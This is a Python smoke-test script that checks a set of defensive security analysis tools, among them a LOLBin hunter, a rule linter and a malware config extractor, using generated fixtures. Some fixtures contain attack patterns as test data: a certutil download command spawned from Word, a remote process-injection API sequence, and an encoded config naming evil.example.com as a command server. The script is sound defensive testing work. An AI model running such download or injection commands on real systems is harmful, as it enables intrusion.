#!/usr/bin/env python3
"""Smoke-test every skill's scripts/analyst.py.

Two layers of checks, all offline and sample-free:

1. ``--help`` runs for every ``analyst.py`` (must exit 0). Catches import errors, argparse
   misconfiguration, and syntax problems that ``ast`` alone would miss.
2. A curated set of scripts is exercised with generated fixtures via real subcommands so the
   core parsing/analysis paths actually execute.

Usage:
    python tools/smoke-test.py            # run all checks
    python tools/smoke-test.py --help-only # only the --help layer

Exit code is non-zero if any check fails. Stdlib only.
"""
from __future__ import annotations

import argparse
import glob
import json
import os
import subprocess
import sys
import tempfile

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable


def _agent_scripts() -> list[str]:
    pattern = os.path.join(REPO_ROOT, "skills", "*", "scripts", "analyst.py")
    return sorted(glob.glob(pattern))


def _run(args: list[str], cwd: str | None = None) -> subprocess.CompletedProcess:
    return subprocess.run(args, capture_output=True, text=True, cwd=cwd or REPO_ROOT)


def help_layer() -> list[str]:
    failures = []
    scripts = _agent_scripts()
    for script in scripts:
        proc = _run([PY, script, "--help"])
        if proc.returncode != 0:
            rel = os.path.relpath(script, REPO_ROOT).replace(os.sep, "/")
            failures.append(f"{rel}: --help exited {proc.returncode}\n{proc.stderr.strip()}")
    print(f"[help] {len(scripts) - len(failures)}/{len(scripts)} analyst.py respond to --help")
    return failures


def _skill_script(name: str) -> str:
    return os.path.join(REPO_ROOT, "skills", name, "scripts", "analyst.py")


def _write(tmp: str, fname: str, content: str) -> str:
    path = os.path.join(tmp, fname)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    return path


def _expect_json(proc: subprocess.CompletedProcess, label: str, failures: list[str],
                 contains: list[str] | None = None) -> None:
    if proc.returncode not in (0, 1):  # 1 is allowed for "issues found" style tools
        failures.append(f"{label}: exited {proc.returncode}\n{proc.stderr.strip()}")
        return
    try:
        json.loads(proc.stdout)
    except json.JSONDecodeError as exc:
        failures.append(f"{label}: output is not valid JSON ({exc})")
        return
    for needle in contains or []:
        if needle not in proc.stdout:
            failures.append(f"{label}: expected '{needle}' in output")


def fixture_layer() -> list[str]:
    """Exercise a representative set of scripts with generated fixtures."""
    failures: list[str] = []
    checks = 0
    with tempfile.TemporaryDirectory() as tmp:
        # 1. API call trace classifier -> detects an injection sequence.
        trace = _write(tmp, "trace.json", json.dumps(
            ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]))
        proc = _run([PY, _skill_script("analyzing-api-call-traces"), "classify", trace])
        _expect_json(proc, "analyzing-api-call-traces", failures,
                     contains=["remote_process_injection", "T1055.002"])
        checks += 1

        # 2. Telemetry baseliner -> builds a baseline file.
        hist = _write(tmp, "hist.csv", "Image\nsvchost.exe\nsvchost.exe\nexplorer.exe\n")
        base = os.path.join(tmp, "baseline.json")
        proc = _run([PY, _skill_script("establishing-telemetry-baselines"),
                     "baseline", hist, "--field", "Image", "--out", base])
        _expect_json(proc, "establishing-telemetry-baselines", failures,
                     contains=["distinct_values"])
        checks += 1

        # 3. LOLBin hunter -> scores certutil-from-Word.
        events = _write(tmp, "events.csv",
                        "Image,CommandLine,ParentImage\n"
                        "C:\\Windows\\System32\\certutil.exe,"
                        "certutil -urlcache -f http://x/y.exe,"
                        "C:\\Windows\\System32\\WINWORD.EXE\n")
        proc = _run([PY, _skill_script("hunting-lolbin-abuse-on-windows"), "hunt", events])
        _expect_json(proc, "hunting-lolbin-abuse-on-windows", failures,
                     contains=["certutil.exe"])
        checks += 1

        # 4. Crypto-constant scanner -> finds the AES S-box.
        aes_sbox = bytes([0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
                          0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76])
        cbin = os.path.join(tmp, "crypto.bin")
        with open(cbin, "wb") as fh:
            fh.write(b"PAD" + aes_sbox + b"\x00" * 16)
        proc = _run([PY, _skill_script("identifying-cryptographic-routines-in-binaries"),
                     "scan", cbin])
        _expect_json(proc, "identifying-cryptographic-routines-in-binaries", failures,
                     contains=["AES S-box"])
        checks += 1

        # 5. Control-flow deflattener -> recovers the dispatcher chain.
        cfg = _write(tmp, "cfg.json", json.dumps({
            "state_var": "eax", "entry": "A", "blocks": [
                {"id": "D", "succ": ["A", "B", "C"], "in_degree": 4, "state_compare": True},
                {"id": "A", "succ": ["D"], "in_degree": 1, "next_state": "B"},
                {"id": "B", "succ": ["D"], "in_degree": 1, "next_state": "C"},
                {"id": "C", "succ": ["D"], "in_degree": 1, "next_state": None},
            ]}))
        proc = _run([PY, _skill_script("defeating-control-flow-flattening"), "detect", cfg])
        _expect_json(proc, "defeating-control-flow-flattening", failures,
                     contains=["\"dispatcher\": \"D\""])
        checks += 1

        # 6. IDS rule linter -> flags a short unanchored content + duplicate sid.
        rules = _write(tmp, "r.rules",
                       'alert http any any -> any any (msg:"a"; content:"GET"; sid:1; rev:1;)\n'
                       'alert tcp any any -> any 443 (msg:"b"; content:"x"; http.host; '
                       'sid:1; rev:1; classtype:trojan-activity;)\n')
        proc = _run([PY, _skill_script("writing-suricata-and-snort-rules"), "lint", rules])
        _expect_json(proc, "writing-suricata-and-snort-rules", failures,
                     contains=["duplicate sid"])
        checks += 1

        # 7. Config extractor -> decodes a XOR'd blob into fields.
        plain = b"evil.example.com" + b"\x00" * 48 + (8080).to_bytes(2, "little") \
            + bytes([10, 0, 0, 5])
        ct = bytes(b ^ 0x5A for b in plain)
        blob = os.path.join(tmp, "blob.bin")
        with open(blob, "wb") as fh:
            fh.write(b"CFG0" + ct)
        spec = _write(tmp, "spec.json", json.dumps({
            "blob": {"marker": "CFG0", "length": 70},
            "decode": [{"type": "xor", "key": "0x5a"}],
            "fields": [{"name": "c2", "offset": 0, "length": 64, "type": "str"},
                       {"name": "port", "offset": 64, "type": "u16"},
                       {"name": "ip", "offset": 66, "type": "ipv4"}]}))
        proc = _run([PY, _skill_script("building-config-extractors"), "extract", blob,
                     "--spec", spec])
        _expect_json(proc, "building-config-extractors", failures,
                     contains=["8080", "10[.]0[.]0[.]5"])
        checks += 1

    print(f"[fixture] {checks - len(failures)}/{checks} fixture checks passed")
    return failures


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Smoke-test all skill scripts")
    parser.add_argument("--help-only", action="store_true",
                        help="run only the --help layer")
    args = parser.parse_args(argv)

    failures = help_layer()
    if not args.help_only:
        failures += fixture_layer()

    if failures:
        print(f"\nFAIL: {len(failures)} smoke-test problem(s):", file=sys.stderr)
        for f in failures:
            print(f"  - {f}", file=sys.stderr)
        return 1
    print("\nAll smoke tests passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
